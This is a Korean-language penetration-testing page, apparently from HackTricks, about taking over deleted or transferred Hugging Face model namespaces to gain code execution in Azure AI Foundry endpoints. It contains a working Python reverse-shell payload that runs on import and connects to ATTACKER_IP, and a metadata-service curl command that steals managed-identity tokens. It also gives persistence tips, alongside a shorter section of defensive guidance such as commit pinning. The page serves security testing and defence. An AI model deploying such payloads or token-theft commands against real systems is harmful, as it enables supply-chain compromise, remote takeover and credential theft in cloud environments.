# Azure - AI Foundry Post-Exploitation via Hugging Face 모델 네임스페이스 재사용

{{#include ../../../banners/hacktricks-training.md}}

## 시나리오

- Azure AI Foundry Model Catalog에는 원클릭 배포를 위한 많은 Hugging Face (HF) 모델이 포함되어 있다.
- HF 모델 식별자는 Author/ModelName이다. HF author/org가 삭제되면, 누구나 해당 author를 재등록하여 동일한 ModelName으로 legacy path에 모델을 게시할 수 있다.
- 이름만으로(pull by name) 가져오는 pipelines 및 catalogs(commit pinning/무결성 체크 없음)는 공격자 제어의 repo로 해석된다. Azure가 모델을 배포할 때 loader code가 endpoint 환경에서 실행되어 해당 endpoint의 권한으로 RCE를 획득할 수 있다.

일반적인 HF takeover 사례:
- 소유권 삭제: takeover가 이루어질 때까지 기존 경로가 404가 된다.
- 소유권 이전: 기존 author가 존재하는 동안 기존 경로는 새 author로 307 리다이렉트된다. 이후 기존 author가 삭제되고 재등록되면 redirect가 깨지고 공격자의 repo가 legacy path에서 서비스된다.

## 재사용 가능한 네임스페이스(HF) 식별
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>        # 200 exists, 404 deleted/available

# Check model path
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 -> redirect (transfer case), 404 -> deleted until takeover
```
## Azure AI Foundry에 대한 엔드투엔드 공격 흐름

1) Model Catalog에서 원래 작성자가 HF에서 삭제되었거나 이전되어(기존 작성자가 제거된) HF 모델을 찾습니다.  
2) HF에서 방치된 작성자를 다시 등록하고 ModelName을 재생성합니다.  
3) import 시 실행되거나 trust_remote_code=True를 요구하는 loader code가 포함된 악성 repo를 게시합니다.  
4) Azure AI Foundry에서 레거시 Author/ModelName을 배포합니다. 플랫폼이 공격자 repo를 가져오고; loader가 Azure endpoint의 container/VM 내부에서 실행되어 endpoint 권한을 가진 RCE를 획득합니다.

예시 페이로드 조각 (import 시 실행됨, 시연용):
```python
# __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # or powershell on Windows images

if os.environ.get("AZUREML_ENDPOINT","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
Notes
- AI Foundry 배포는 HF와 통합될 때 일반적으로 모델의 config에서 참조된 repo 모듈(예: auto_map)을 클론하고 import하며, 이는 코드 실행을 유발할 수 있습니다. 일부 경로는 trust_remote_code=True가 필요합니다.
- 접근 권한은 보통 엔드포인트의 managed identity/service principal 권한과 일치합니다. 이를 데이터 접근 및 lateral movement within Azure를 위한 초기 발판으로 간주하세요.

## Post-Exploitation Tips (Azure Endpoint)

- environment variables 및 MSI endpoints에서 tokens을 열거하세요:
```bash
# Azure Instance Metadata Service (inside Azure compute)
curl -H "Metadata: true" \
"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```
- 획득한 token으로 마운트된 스토리지, model artifacts 및 접근 가능한 Azure 서비스들을 확인하세요.
- 플랫폼이 HF에서 다시 pull할 경우, poisoned model artifacts를 남겨 persistence를 고려하세요.

## Azure AI Foundry 사용자를 위한 방어 지침

- HF에서 로드할 때 모델을 commit 단위로 pin하세요:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- 검증된 HF models를 신뢰할 수 있는 내부 레지스트리에 미러링하고 거기서 배포하세요.
- 코드베이스와 defaults/docstrings/notebooks를 지속적으로 스캔하여 삭제되었거나 이전된 하드코딩된 Author/ModelName을 찾아 업데이트하거나 핀(pin)하세요.
- 배포하기 전에 author 존재 여부와 모델 출처(provenance)를 검증하세요.

## 인식 휴리스틱 (HTTP)

- Deleted author: author 페이지 404; legacy model path 404 until takeover.
- Transferred model: legacy path 307 to new author while old author exists; if old author later deleted and re-registered, legacy path serves attacker content.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## 교차 참조

- 더 광범위한 방법론 및 공급망 관련 노트를 참조하세요:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## 참고 자료

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
